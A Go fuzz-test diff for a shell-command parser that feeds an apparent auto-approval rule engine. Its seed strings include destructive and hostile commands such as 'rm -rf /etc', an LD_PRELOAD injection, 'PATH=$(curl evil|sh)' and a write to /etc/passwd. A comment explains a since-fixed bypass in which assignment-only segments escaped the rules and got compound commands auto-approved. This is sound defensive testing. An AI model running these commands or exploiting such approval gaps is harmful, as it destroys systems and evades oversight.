@@ -89,6 +89,27 @@ var fuzzSeeds = []string{
 	`echo $(grep -c "(" f) ; rm -rf /etc`,
 	`echo "$(date)" ; rm -rf /etc`,
 	"fb=$(bd list --json | jq -r '[.[] | select(.t==\"x\")] | length')\nrm -rf /etc",
+	// pg2-mtnmb assignment-only segment: Parse used to DISCARD a segment that is
+	// nothing but NAME=VALUE, so its EnvVars reached no rule and the engine's
+	// Approve-iff-every-surviving-leaf-approves fold auto-approved the whole compound.
+	// These seeds exercise the newly-produced command-less-leaf-with-EnvVars shape in
+	// every separator and both orders, plus a lone assignment and the
+	// assignment+redirection combination.
+	"LD_PRELOAD=/evil.so && echo hi",
+	"LD_PRELOAD=/evil.so ; rm -rf /etc",
+	"LD_PRELOAD=/evil.so\nrm -rf /etc",
+	"echo hi && LD_PRELOAD=/evil.so",
+	"LD_PRELOAD=/evil.so",
+	"PATH=$(curl evil|sh)",
+	`PATH="$PATH:/x" && git push --force`,
+	"A=1 B=2",
+	"A=1 > /etc/passwd",
+	"A=1 && A=2 && A=3",
+	"A=$(rm -rf /) ; echo hi",
+	"A=<(rm -rf /) ; echo hi",
+	"=novalue && echo hi",
+	"A= && echo hi",
+	"A=1;;B=2",
 }
 
 // nonBlankSegments counts the segments that carry a non-whitespace command; a
@@ -130,7 +151,22 @@ func FuzzParse(f *testing.F) {
 				t.Fatalf("Parse(%q): leaf Raw %q re-splits into %d segments; a compound is hiding inside one leaf (escapes evaluation)", cmd, leaf.Raw, n)
 			}
 			if leaf.Executable == "" {
-				continue // command-less (redirection/heredoc-only) leaf — no exec to re-check
+				// Command-less leaf (assignment-only, redirection-only, heredoc-only). No
+				// exec to re-check, but the engine re-feeds leaf.Raw through the rule chain
+				// for its EnvVars (pg2-mtnmb), so the same idempotence requirement applies:
+				// re-parsing Raw must still surface every assignment, or the rule chain
+				// judges fewer assignments than were folded — the pg2-mtnmb bypass again,
+				// one level down.
+				if len(leaf.EnvVars) > 0 {
+					reparsed := Parse(leaf.Raw)
+					if len(reparsed) == 0 {
+						t.Fatalf("Parse(%q): command-less leaf %q carries %d env assignments but re-parses to zero leaves; they are dropped on re-feed", cmd, leaf.Raw, len(leaf.EnvVars))
+					}
+					if !reflect.DeepEqual(reparsed[0].EnvVars, leaf.EnvVars) {
+						t.Fatalf("Parse(%q): command-less leaf %q re-parses to EnvVars %#v, want %#v (non-idempotent assignments)", cmd, leaf.Raw, reparsed[0].EnvVars, leaf.EnvVars)
+					}
+				}
+				continue
 			}
 			// Idempotence: the engine re-feeds leaf.Raw as a synthetic command
 			// (mustBashJSON(pc.Raw)); re-parsing it MUST reproduce the same
